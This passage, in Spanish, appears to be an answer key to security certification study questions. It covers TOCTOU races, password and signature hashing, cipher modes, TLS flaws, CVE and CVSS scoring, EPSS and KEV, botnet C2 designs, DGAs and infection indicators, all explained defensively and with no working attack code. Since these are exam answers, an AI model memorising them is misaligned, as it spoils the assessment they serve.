**Q25.** El **check** es `[ -e "$f" ]` (probar si el archivo existe); el **use** es `echo ... > "$f"` (escribir en él). Entre el check y el use, el atacante intercambia `$f` por un symlink a `/etc/passwd`, así que la escritura privilegiada aterriza en el objetivo elegido por el atacante — una carrera TOCTOU. Corrección: hacerlo **atómico** — por ejemplo `set -o noclobber` con `> "$f"` fallando si existe, o `open(O_CREAT|O_EXCL)` / `mktemp`, que crean-y-verifican en una sola llamada al sistema sin ventana explotable; evitá nombres predecibles en directorios escribibles por todos.

**Q26.** Dos razones *diferentes*. Como **hashes de contraseña**, MD5/SHA-1 fallan porque son *rápidos* y (tal como se usan) sin salt, así que los atacantes los rompen por fuerza bruta/rainbow-table a miles de millones/seg — la corrección son KDFs lentas, con salt y memory-hard (bcrypt/scrypt/Argon2), independientes de la matemática de colisiones. Como **hashes de firma/certificado**, fallan porque ya no son **resistentes a colisiones** (MD5 roto desde 2004/2008 rogue-CA; SHA-1 SHAttered 2017), permitiendo que un atacante fabrique dos documentos con el mismo digest para que una firma se transfiera a una falsificación.

**Q27.** ECB cifra cada bloque independientemente con la misma clave, así que **bloques de texto plano idénticos → bloques de texto cifrado idénticos**. Las regiones uniformes grandes de una imagen conservan así su contorno (el pingüino sigue siendo visible). CBC (encadenando cada bloque con el texto cifrado previo mediante un IV) y GCM (modo contador + autenticación) agregan **seguridad semántica mediante aleatorización/IV**, así que bloques de texto plano idénticos se cifran de forma distinta; GCM además provee integridad/autenticación.

**Q28.** Ejemplos — **POODLE** (padding oracle de CBC en SSLv3: falla de protocolo/modo), **BEAST** (predictibilidad del IV de CBC en TLS 1.0: protocolo/modo), **Heartbleed** (lectura excesiva de buffer en el heartbeat de OpenSSL: falla de *implementación*), **ROBOT/DROWN** (padding oracle de RSA PKCS#1v1.5: mal uso de protocolo/cripto). Por ejemplo, Heartbleed fue un bug de implementación en una biblioteca; POODLE fue una falla en el protocolo/modo SSLv3 mismo.

**Q29.** Un **CVE** es un identificador único (`CVE-YYYY-NNNNN`) para una vulnerabilidad conocida públicamente, que provee una referencia común entre herramientas/proveedores. Lo asigna una **CNA** (CVE Numbering Authority — MITRE como raíz, más proveedores/organizaciones) bajo el MITRE/CVE Program. Un registro CVE deliberadamente **no** incluye un puntaje de severidad, código de exploit, ni profundidad de remediación — es un identificador + descripción + referencias; el puntaje (CVSS) y el análisis los agregan NVD y otros.

**Q30.** `AV:N` vector de ataque Network (explotable remotamente), `AC:L` complejidad de ataque Low, `PR:N` no se requieren privilegios, `UI:N` sin interacción del usuario, `S:C` **scope Changed** (el componente explotado puede impactar recursos más allá de su ámbito de seguridad), `C:H/I:H/A:H` impacto Alto de confidencialidad, integridad y disponibilidad. `S:C` amplía la contabilidad del impacto (los impactos cuentan contra una autoridad distinta a la del componente vulnerable), lo que combinado con todo-remoto/sin-autenticación/impacto-total da el máximo **10.0**.

**Q31.** **Base** = severidad intrínseca y constante (explotabilidad + impacto). **Temporal/Threat** = factores que varían con el tiempo (madurez del exploit, disponibilidad de remediación, confianza del reporte). **Environmental** = *tu* despliegue (criticidad del activo mediante requisitos de C/I/A, métricas base modificadas para tus controles). El Base por sí solo es un mal priorizador porque ignora si el activo está expuesto/es crítico en *tu* red y si la falla está siendo explotada realmente — un Base 9.8 en una caja de desarrollo aislada puede importar menos que un 6.5 en una joya de la corona expuesta a Internet.

**Q32.** **EPSS** (Exploit Prediction Scoring System, FIRST) estima la *probabilidad de que el CVE sea explotado en el mundo real en los próximos 30 días* — una señal de probabilidad que CVSS no tiene. **CISA KEV** (Known Exploited Vulnerabilities) es una lista curada de CVEs con explotación activa *confirmada*. Combinar "severo" (CVSS) con "probable/conocidamente explotado" (EPSS/KEV) enfoca el esfuerzo limitado de parcheo en lo que realmente va a dañarte.

**Q33.** Las botnets **centralizadas** (IRC/HTTP con uno o pocos servidores C2) son simples y de baja latencia para comandar, pero tienen un único punto de falla — hacer sinkhole/incautar el C2 y la botnet muere. Las botnets **P2P** distribuyen la asignación de tareas entre pares sin servidor central, así que el desmantelamiento requiere alcanzar muchos nodos; el defensor pierde el punto fácil de decapitación y debe enumerar/envenenar la red superpuesta (overlay) en su lugar. P2P gana resiliencia/redundancia a costa de latencia de comando y complejidad.

**Q34.** Un **DGA** genera algorítmicamente un conjunto grande y cambiante de nombres de dominio pseudoaleatorios (sembrados por fecha/hora) que el bot prueba por turnos para encontrar el C2 activo; el operador solo registra unos pocos. Las listas de bloqueo estáticas de IP/dominio fallan porque los dominios rotan constantemente y en su mayoría nunca se registran. La detección que aún funciona: análisis estadístico/ML de las *características* del dominio (alta entropía, cadenas que no son de diccionario) y la avalancha de respuestas **NXDOMAIN** de los bots sondeando nombres no registrados.

**Q35.** Red: (1) **beaconing periódico y de baja fluctuación (jitter)** al mismo host/dominio (temporización de tipo máquina); (2) grandes volúmenes de **DNS/NXDOMAIN saliente** o conexiones a dominios recién registrados/de baja reputación, o tráfico saliente inesperado de SMTP/DDoS. Host: procesos/servicios persistentes desconocidos, entradas de autoarranque inesperadas, o uso elevado de CPU inexplicable (minería de criptomonedas) — corroborado por alertas de EDR/AV o de integridad de archivos.

</details>

---

**Fuentes**

- LPI Exam 303-300 Objectives (v3.0.0): <https://www.lpi.org/our-certifications/exam-303-objectives/>
- Nmap Reference Guide — scan techniques: <https://nmap.org/book/man-port-scanning-techniques.html>
- Linux TCP SYN cookies (`tcp_syncookies`): <https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt>
- OWASP — SQL Injection, XSS, CSRF: <https://owasp.org/www-community/attacks/> · CSRF Prevention Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html>
- CVE Program (MITRE): <https://www.cve.org/> · NVD: <https://nvd.nist.gov/>
- FIRST CVSS v3.1 specification & calculator: <https://www.first.org/cvss/v3-1/specification-document> · <https://www.first.org/cvss/calculator/3.1>
- FIRST EPSS: <https://www.first.org/epss/> · CISA KEV Catalog: <https://www.cisa.gov/known-exploited-vulnerabilities-catalog>